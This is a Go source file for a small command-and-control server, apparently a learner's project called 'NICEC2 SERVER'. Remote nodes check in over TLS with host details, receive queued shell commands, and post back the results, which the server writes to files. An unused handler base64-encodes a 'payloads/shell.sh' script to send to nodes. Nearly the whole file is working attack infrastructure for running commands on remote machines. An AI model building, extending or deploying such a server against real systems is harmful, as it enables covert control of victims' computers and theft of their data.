package main

import (
	b64 "encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"time"
)

// Banner for the application
const banner string = `

███╗   ██╗██╗ ██████╗███████╗ ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
████╗  ██║██║██╔════╝██╔════╝██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██╔██╗ ██║██║██║     █████╗  ██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║╚██╗██║██║██║     ██╔══╝  ██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
██║ ╚████║██║╚██████╗███████╗╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝ ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
                                                                                                  

`

// Command ID. This will keep going up as commands are added to the queue.
// It should never be bellow 0
var taskID int = 1

// The main array of all nodes that have checked in.
var nodes []node = read_nodes_from_file()

// The array holding the queue of tasks
var task_queue []Task

type Task struct {
	TaskID   string
	NodeID   string
	Action   string
	Content  string
	Progress string
}

type Task_Response struct {
	TaskID   string
	Progress string // Completed / Failed
	Result   string // Data from the task
}

type check_in struct {
	ID       string
	Hostname string
	Platform string
}

type node struct {
	ID             string
	Hostname       string
	Platform       string
	First_Check_In string
	Last_Check_In  string
}

func main() {

	// Make some hard coded tasks
	task_queue = append(task_queue, create_task("NodeName", "run", "This Command"))
	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "touchsd HelloThere"))
	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "touch HelloThere1"))
	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "touch HelloThere2"))
	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "ls"))
	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "pwd"))
	task_queue = append(task_queue, create_task("FCB85CB9-9452-539B-9988-48A4C5E3DFD3", "run command", "ls /System/DriverKit/Runtime/System/Library/Frameworks/Kernel.framework/Resources"))

	fmt.Println("The current task queue")
	fmt.Println(task_queue)
	fmt.Println()
	fmt.Println()

	handleRequests()

}

// Api endpoints and stuff
func handleRequests() {

	http.HandleFunc("/checkin", nodeCheckIn)
	http.HandleFunc("/node_response", node_response)
	// http.HandleFunc("/getPayload", getPayload)

	log.Fatal(http.ListenAndServeTLS(":8081", "server.crt", "server.key", nil))
}

// Function for that runs each time the node checks in
func nodeCheckIn(w http.ResponseWriter, req *http.Request) {

	var blank_response = string(`
	{
		"taskID": "0", 
		"task": "",  
		"arg" : ""
		
	}`)

	// Get's the current time
	dt := time.Now()

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node_that_checked_in check_in
	err := decoder.Decode(&node_that_checked_in)
	if err != nil {
		panic(err)
	}

	// Adding the node to the list (Needs to be only if new node)

	if is_new_node(node_that_checked_in.ID) == true {
		fmt.Println("Damn look it's a new node!")
		nodes = append(nodes, createNode(node_that_checked_in.ID, node_that_checked_in.Hostname, node_that_checked_in.Platform, dt.String()))
	} else {

		update_node(node_that_checked_in.ID, dt.String())

		fmt.Println("Node re-checked in")
	}

	// Output something pretty
	fmt.Println()
	fmt.Println("============= New Check in =============")

	fmt.Println("ID: " + node_that_checked_in.ID)
	fmt.Println("Hostname: " + node_that_checked_in.Hostname)
	fmt.Println("Platform: " + node_that_checked_in.Platform)
	fmt.Println("Time: " + dt.String())

	fmt.Println("============= ----------- =============")

	// Find that nodes task
	Task_location, find_task_message := find_task_unsent(node_that_checked_in.ID)

	// This handles sending back a blank response if no task is found
	if find_task_message != "" {
		fmt.Println("No task for node")

		// Send the blank response back
		fmt.Fprintf(w, blank_response)

	} else {

		var response = string(`{"taskID": "` + task_queue[Task_location].TaskID + `", "task": "` + task_queue[Task_location].Action + `",  "arg": "` + task_queue[Task_location].Content + `"}`)

		// Stops the same command from being sent multiple times
		task_queue[Task_location].Progress = "sent"

		// Send the response back
		fmt.Fprintf(w, response)
	}

	fmt.Println(task_queue)

	save_nodes_to_file()
}

// Handles when a node sends back the result of a task (Command output)
func node_response(w http.ResponseWriter, req *http.Request) {

	fmt.Println("A TASK HAS BEEN COMPLETED!!!!!s")

	fmt.Println(req.Body)

	// Decode the json body
	decoder := json.NewDecoder(req.Body)

	var response_to_task Task_Response

	err := decoder.Decode(&response_to_task)
	if err != nil {

		fmt.Println("There was an error decoding the JSON in the task response")
		panic(err)
	}

	fmt.Println(response_to_task)

	// Now we have the result.

	// change task in task list to complete
	task_location, find_task_error := find_task_by_id(response_to_task.TaskID)
	if find_task_error != "" {
		fmt.Println(find_task_error)
	}

	task_queue[task_location].Progress = response_to_task.Progress

	fmt.Println(response_to_task.Result)

	// Write result to file. Temporary measure
	f, err := os.Create(response_to_task.TaskID + ".txt")

	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	_, err2 := f.WriteString(response_to_task.Result + "\n")

	if err2 != nil {
		log.Fatal(err2)
	}

	fmt.Println("done")

	fmt.Println()

}

// Handles gathering a file for the node to recieve
func nodeSendFile(w http.ResponseWriter, req *http.Request) {

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node check_in
	err := decoder.Decode(&node)
	if err != nil {
		panic(err)
	}

	script := read_script("payloads/shell.sh")

	var response = []byte(`
	{
		"ID": "` + node.ID + `",
		"command": "File",
		"details": "` + script + `"
	}`)

	// Sending the reponse
	fmt.Fprintf(w, string(response))

}

// Reads and encodes a script. Read to send to the node
func read_script(path string) string {

	// Read the file
	bFile, _ := ioutil.ReadFile(path)
	script := string(bFile)
	// script = strings.Replace(script, "\n", "", -1)

	// fmt.Println(script)

	// here is where we turn the file into some nice data I think
	encoded_script := b64.StdEncoding.EncodeToString([]byte(script))

	return encoded_script

}

////////////////////////////////////
/// Node slice  			    ////
////////////////////////////////////

func createNode(ID string, Hostname string, Platform string, Timestamp string) node {

	newNode := node{ID, Hostname, Platform, Timestamp, Timestamp}
	return newNode

}

func is_new_node(input_ID string) bool {

	for _, value := range nodes {
		if value.ID == input_ID {
			return false
		}
	}

	return true
}

// updates the node in the list
func update_node(ID string, Timestamp string) {

	node_position, error := find_node(ID)
	if error != "" {
		fmt.Println(error)
		return
	}

	nodes[node_position].Last_Check_In = Timestamp

}

// Finds a nodes position in the slice
func find_node(input_ID string) (int, string) {

	for i, value := range nodes {
		if value.ID == input_ID {
			return i, ""
		}
	}

	// returns 0 if it can't find anything.
	// pretty sure this small brain, but ehh
	return 0, "💀 Couldn't find node"
}

func display_all_nodes() {

	fmt.Println("")

	fmt.Println("[][][][][][][][][] Nodes [][][][][][][][][]")
	fmt.Println()
	for _, value := range nodes {
		fmt.Println("NodeID:        " + value.ID)
		fmt.Println("Hostname:      " + value.Hostname)
		fmt.Println("Platform:      " + value.Platform)
		fmt.Println("First Seen:    " + value.First_Check_In)
		fmt.Println("Last Seen:     " + value.Last_Check_In)
		fmt.Println("------------------ ===== ------------------")
	}
}

////////////////////////////////////
/// File Nonsense			    ////
////////////////////////////////////

func save_nodes_to_file() {
	out, _ := json.MarshalIndent(nodes, "", "  ")
	err := ioutil.WriteFile("nodes.json", out, 0644)
	if err != nil {
		fmt.Println(err.Error())
	}
}

func read_nodes_from_file() []node {
	fmt.Println("These are the nodes allready in the file")
	fmt.Printf("\n\n")
	content, err := ioutil.ReadFile("nodes.json")
	if err != nil {
		fmt.Println(err.Error())
	}

	var nodes []node
	err3 := json.Unmarshal(content, &nodes)
	if err3 != nil {
		fmt.Println("error with Unmarshal")
		fmt.Println(err3.Error())
	}

	for _, x := range nodes {
		fmt.Println(x.ID)
	}

	fmt.Printf("\n\n")
	return nodes
}

////////////////////////////////////
/// Task queue  			    ////
////////////////////////////////////

func create_task(node string, task string, arg string) Task {

	// Wouldn't want a small task ID
	taskID = taskID + 1

	// Not sure why i need to convert here, but 🤷‍♀️
	ID_string := strconv.Itoa(taskID)

	newCommand := Task{ID_string, node, task, arg, "waiting"}

	return newCommand

}

// Finds a nodes position in the slice
func find_task(Node_input_ID string) (int, string) {

	for i, value := range task_queue {

		if string(value.NodeID) == Node_input_ID {
			return i, ""
		}
	}

	// returns 0 if it can't find anything.
	// pretty sure this small brain, but ehh
	return 0, "💀 Couldn't find node"
}

// this is for finding a task that we want to get executed
func find_task_unsent(Node_input_ID string) (int, string) {

	for i, value := range task_queue {

		if string(value.NodeID) == Node_input_ID {

			if value.Progress == "waiting" {
				return i, ""
			}

		}
	}

	// returns 0 if it can't find anything.
	// pretty sure this small brain, but ehh
	return 0, "💀 Couldn't find node"
}

// this is for finding a task that we want to get executed
func find_task_by_id(input_task_id string) (int, string) {

	for i, value := range task_queue {

		if string(value.TaskID) == input_task_id {
			return i, ""
		}

	}

	// returns 0 if it can't find anything.
	// pretty sure this small brain, but ehh
	return 0, "💀 Couldn't find node"
}
